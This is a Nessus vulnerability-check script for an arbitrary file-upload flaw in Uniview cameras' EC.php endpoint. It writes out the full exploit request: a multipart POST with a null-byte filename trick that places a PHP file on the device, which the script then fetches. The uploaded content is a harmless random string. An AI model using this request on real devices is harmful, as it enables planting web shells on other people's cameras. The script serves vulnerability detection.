############################################################
# Author: ox50sec@webray.com.cn
# Copyright @WebRAY  /opt/nessus/bin/nasl -k time172.18.253.11.kb -Xt 86.124.160.115 uniview_5-nessus.nasl
############################################################
include("compat.inc");

if (description)
{
  script_id(51799043);
  script_version("1.3");
  script_name(english:"Uniview camera device EC.php File Upload");
  script_summary(english:"Uniview camera device EC.php File Upload");
  script_set_attribute(attribute:"description", value:"Uniview camera device EC.php File Upload");
  script_set_attribute(attribute:"solution", value:"update system");
  script_set_attribute(attribute:"risk_factor", value:"High");
  script_set_attribute(attribute:"vuln_publication_date",value:"2018/10/11");
  script_set_attribute(attribute:"patch_publication_date",value:"2018/10/11");
  script_set_attribute(attribute:"plugin_publication_date", value:"2018/10/22");
  script_set_attribute(attribute:"plugin_type", value:"remote");
  script_set_attribute(attribute:"in_the_news", value:"true");
  script_end_attributes();
  script_family(english:"Camera");
  script_dependencies("find_service.nasl", "http_version.nasl");
  script_category(ACT_GATHER_INFO);
  script_copyright(english:"This script is Copyright (C) WebRAY, Inc.");
  script_require_ports("Services/www", 80);
  exit(0);
}



include("audit.inc");
include("global_settings.inc");
include("misc_func.inc");
include("http.inc");
include("openvas-https2.inc");


file_name="test.php";
file_content=rand_str(length:12, charset:"0123456789abcdef");
boundary = "--------" + rand_str(length:12, charset:"0123456789abcdef");
content_type = "multipart/form-data; boundary=" + boundary;

data = '--' + boundary + '\r\n';
data += 'Content-Disposition: form-data; name="file"; filename="' + file_name +'"\r\n';
data += 'Content-Type: application/octet-stream\r\n\r\n';
data += file_content + '\r\n';
data += '--' + boundary + '--\r\n';


function check_vuln(port){
	url = string('/Interface/DevManage/EC.php?cmd=upload&GAJAX_USERID=up_test.php%00');
	req = http_send_recv3(method: "POST", port: port, item: url, data:data,content_type:content_type,add_headers: make_array("User_Agent", "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:47.0) Gecko/20100101 Firefox/47.0"));
	res = http_last_sent_request();
	if( "200 O" >!< req[0] && 'success":true' >!< req[0]) exit(0);
	req_find = http_send_recv3(method: "GET", port: port, item: "/Interface/DevManage/up_test.php", add_headers: make_array("User_Agent", "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:47.0) Gecko/20100101 Firefox/47.0"));
	if("200 O">< req_find[0] && file_content >< req_find[2]){
	if (report_verbosity > 0) security_hole(port:port, extra:res+req_find[2]);
	    else security_hole(port);
        }
}

function check_vuln_ssl(port){
	url = string('/Interface/DevManage/EC.php?cmd=upload&GAJAX_USERID=upload_test.php%00');
	res = http_send_recv3(method: "POST", port: port, item: url, data:data,content_type:content_type, add_headers: make_array("User_Agent", "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:47.0) Gecko/20100101 Firefox/47.0"));
	req = http_last_sent_request();
	ssl_req = https_req_get(port:port , request:req);
	if( "200 O" >!< ssl_req && 'success":true' >!< ssl_req) exit(0);
	reqs = http_get(item:"/Interface/DevManage/upload_test.php", port:port);
    ssl_reqs = https_req_get(request:reqs, port:port);
	if("200 O"><ssl_reqs && file_content >< ssl_reqs){
		if (report_verbosity > 0) security_hole(port:port, extra:req+ssl_reqs);
	    else security_hole(port);
	    }
}


##################################

kbs = get_kb_list("www/banner/*");
foreach k (keys(kbs)) {
	port = substr(k,11);
	ssl = get_kb_list("SSL/Transport/"+port);
	if(!ssl) {
   		check_vuln(port:port);
	} else {
   		check_vuln_ssl(port:port);
	}
}